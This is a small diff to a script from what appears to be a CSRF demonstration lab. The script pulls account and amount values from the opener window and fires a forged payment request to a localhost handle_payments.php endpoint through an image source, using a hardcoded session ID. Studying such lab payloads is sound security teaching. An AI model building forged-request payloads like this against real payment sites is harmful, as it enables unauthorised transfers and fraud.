@@ -9,8 +9,8 @@
 </body>
 <script>
    var doc = window.opener.document;
-   var acc = document.getElementById('acc_no2');
-   var amt = document.getElementById('amt2');   
+   var acc = doc.getElementById('acc_no2');
+   var amt = doc.getElementById('amt2');   
    var link_rel = "http://localhost:81/CSRFDemonstration/Reflected/handle_payments.php?acc_no=" + acc + "&amount=" + amt + "&sessionID=elsm34cmmpbed371b3li7sd6j3";
    document.getElementById("im").src = link_rel;
 </script>
